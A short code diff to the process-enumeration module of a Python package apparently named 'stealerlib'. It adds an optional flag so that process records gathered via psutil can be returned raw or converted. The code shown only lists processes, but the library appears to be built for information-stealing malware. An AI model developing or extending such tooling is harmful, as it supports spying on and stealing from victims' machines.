@@ -6,6 +6,7 @@
 """
 
 from stealerlib.system import *
+from stealerlib.system.types import SystemTypes
 
 
 class Processes:
@@ -13,13 +14,15 @@ class Processes:
         self.processes = []
 
     @catch
-    def get_processes(self) -> list:
+    def get_processes(self, conv: bool=True) -> list:
         pids = psutil.pids()
 
         for pid in pids:
-            new_process = self.get_process(pid=pid)
-            if new_process:
-                self.processes.append(new_process.conv())
+            obj_process = self.get_process(pid=pid)
+            if obj_process:
+                self.processes.append(
+                    obj_process.conv() if conv else obj_process
+                )
 
         return self.processes
 
